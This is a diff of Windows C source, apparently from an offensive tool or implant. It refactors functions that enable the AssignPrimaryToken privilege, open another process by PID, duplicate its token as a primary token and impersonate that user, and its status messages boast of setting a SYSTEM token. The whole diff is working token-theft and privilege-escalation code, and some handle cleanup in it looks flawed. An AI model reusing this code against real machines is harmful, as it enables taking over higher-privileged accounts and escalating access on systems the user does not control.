@@ -258,32 +258,19 @@ char *EnableDebugPrivilege() {
     return result;
 }
 
-#include <windows.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-
-char *EnableAssignPrimaryTokenPrivilege() { 
+BOOL EnableAssignPrimaryTokenPrivilege() { 
     HANDLE hToken;
-    char *result;
-    char *failedProc = "[-] OpenProcessToken error\r\n";
-    char *lookupError = "[-] LookupPrivilegeValue error\r\n";
-    char *adjustError = "[-] AdjustTokenPrivileges error\r\n";
     
     // Open the process token
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
-        result = malloc(strlen(failedProc) + 1);
-        strcpy(result, failedProc);
-        return result;
+        return FALSE;
     }
 
     LUID luid;
     // Look up the LUID for the "Assign Primary Token" privilege
     if (!LookupPrivilegeValue(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &luid)) {
-        result = malloc(strlen(lookupError) + 1);
-        strcpy(result, lookupError);
         CloseHandle(hToken);
-        return result;
+        return FALSE;
     }
 
     TOKEN_PRIVILEGES tp;
@@ -293,26 +280,14 @@ char *EnableAssignPrimaryTokenPrivilege() {
 
     // Adjust the token privileges
     if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
-        result = malloc(strlen(adjustError) + 1);
-        strcpy(result, adjustError);
         CloseHandle(hToken);
-        return result;
+        return FALSE;
     }
 
     CloseHandle(hToken);
     
-    // Success messages
-    char *goodProc = "[+] Local process token opened.\r\n";
-    char *goodLookup = "[+] Privilege list received.\r\n";
-    char *goodAdjust = "[+] Assign Primary Token privilege enabled.\r\n";
-    
-    int len = strlen(goodProc) + strlen(goodLookup) + strlen(goodAdjust);
-    result = malloc(len + 1);
-    strcpy(result, goodProc);
-    strcat(result, goodLookup);
-    strcat(result, goodAdjust);
-    
-    return result;
+    // Success messages    
+    return TRUE;
 }
 
 char *name(){
@@ -336,7 +311,9 @@ char *name(){
     return result;
 }
 
+
 HANDLE OpenProcessWithToken(DWORD pid) {
+    // Open the target process with necessary access rights
     HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
     if (hProcess == NULL) {
         printf("[-] OpenProcess error: %u\n", GetLastError());
@@ -344,27 +321,31 @@ HANDLE OpenProcessWithToken(DWORD pid) {
     }
 
     HANDLE hToken;
+    // Open the process token
     if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
         printf("[-] OpenProcessToken error: %u\n", GetLastError());
         CloseHandle(hProcess);
         return NULL;
     }
 
-    HANDLE hDuplicatedToken;
-    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDuplicatedToken)) {
+    HANDLE hPrimaryToken;
+    // Duplicate the token to create a primary token
+    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken)) {
         printf("[-] DuplicateTokenEx error: %u\n", GetLastError());
         CloseHandle(hToken);
         CloseHandle(hProcess);
         return NULL;
     }
 
+    // Clean up handles
     CloseHandle(hToken);
     CloseHandle(hProcess);
 
-    return hDuplicatedToken;
+    return hPrimaryToken; // Return the primary token
 }
 
 HANDLE getPrimaryTokenFromProcess(DWORD processId) {
+    // Open the target process with necessary access rights
     HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, FALSE, processId);
     if (!hProcess) {
         printf("OpenProcess failed (Error: %lu)\n", GetLastError());
@@ -379,33 +360,46 @@ HANDLE getPrimaryTokenFromProcess(DWORD processId) {
         return NULL;
     }
 
-    // If needed, you can duplicate the token to create a primary token here
+    HANDLE hPrimaryToken;
+    // Duplicate the token to create a primary token
+    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken)) {
+        printf("DuplicateTokenEx failed (Error: %lu)\n", GetLastError());
+        CloseHandle(hToken);
+        CloseHandle(hProcess);
+        return NULL;
+    }
 
-    CloseHandle(hProcess); // Close the process handle
-    return hToken; // Return the token handle
+    // Clean up handles
+    CloseHandle(hToken);    // Close the original token handle
+    CloseHandle(hProcess);  // Close the process handle
+
+    return hPrimaryToken; // Return the primary token handle
 }
 
 char *Impersonate(int pid){
     char *first_user = name();
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
-    HANDLE hToken = OpenProcessWithToken(pid);
+    HANDLE hToken = getPrimaryTokenFromProcess(pid);
     char *open = "[-] Failed to obtain duplicated token.\r\n";
     char *new_user = name();
-    char *enable_assign = EnableAssignPrimaryTokenPrivilege();
-    char *impersonateStr = "[+] Impersonating new user.\r\n";
-    char *reverting = "[+] Reverting to original user.\r\n";
+    char *enable_assign = "[-] AssignPrimaryToken privilege disabled.\r\n";
+
+    if (EnableAssignPrimaryTokenPrivilege()){
+        enable_assign = "[+] AssignPrimaryToken privilege enabled. \r\n";
+    }
     
+    char *impersonation = "[+] Impersonation successfull.\r\n";
     if (hToken) {
         open = "[+] Obtained duplicated token.\r\n";
         if (!SetThreadToken(NULL, hToken)) {
             printf("SetThreadToken failed (Error: %lu)\n", GetLastError());
+            impersonation = "[-] Impersonation unsuccessfull.\r\n";
         } else {
             printf("Successfully set SYSTEM token as primary token.\n");
         }
         // Impersonate the user
         if (!ImpersonateLoggedOnUser(hToken)) {
-            impersonateStr = "[-] ImpersonateLoggedOnUser error.";
             CloseHandle(hToken);
         }
 
@@ -414,12 +408,11 @@ char *Impersonate(int pid){
         CloseHandle(hToken);
     }
 
-    char *result = malloc((strlen(first_user) + strlen(open) + strlen(enable_assign) + strlen(impersonateStr) + strlen(new_user) + strlen(reverting))*sizeof(char) + 2); 
+    char *result = malloc((strlen(first_user) + strlen(open) + strlen(enable_assign) + strlen(new_user) +strlen(impersonation))*sizeof(char) + 2); 
     strcpy(result, first_user);
     strcat(result, open);
     strcat(result, enable_assign);
-    strcat(result, impersonateStr);
+    strcat(result, impersonation);
     strcat(result, new_user);
-    strcat(result, reverting);
     return result;
 }
